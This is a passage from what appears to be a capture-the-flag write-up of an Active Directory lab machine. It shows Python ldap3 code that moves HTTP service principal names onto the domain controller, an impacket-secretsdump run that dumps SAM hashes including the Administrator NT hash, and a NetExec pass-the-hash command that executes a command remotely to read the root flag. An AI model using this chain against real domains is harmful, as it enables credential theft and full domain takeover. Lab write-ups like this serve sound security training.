print("Removed HTTP SPNs from WEB01$:", conn.result)

# Step 2: Add HTTP SPNs to DC01$ — ticket now encrypted with DC01$'s key
conn.modify('CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb', {
    'servicePrincipalName': [(ldap3.MODIFY_ADD,
        ['HTTP/WEB01', 'HTTP/WEB01.pirate.htb'])]
})
print("Added HTTP SPNs to DC01$:", conn.result)
```

```
impacket-secretsdump -k -no-pass DC01.pirate.htb -dc-ip 10.129.244.95 -target-ip 10.129.244.95                            
Impacket v0.13.0.dev0+20250919.210843.8426ec99 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xaf025c301b1be34c7df7d48a75318dd6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:598295e78bd72d66f837997baf715171:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

lets get the root flag... 
```
nxc smb 10.129.244.95 -u Administrator -H 598295e78bd72d66f837997baf715171 -d pirate.htb -x 'type C:\Users\Administrator\Desktop\root.txt' --smb-timeout 10
SMB         10.129.244.95   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.95   445    DC01             [+] pirate.htb\Administrator:598295e78bd72d66f837997baf715171 (Pwn3d!)
SMB         10.129.244.95   445    DC01             [+] Executed command via atexec
SMB         10.129.244.95   445    DC01             5e3a153df5804beba661599c1b88e8fb

```

got the root flag (it will take 5-10 min to get the flag so just wait)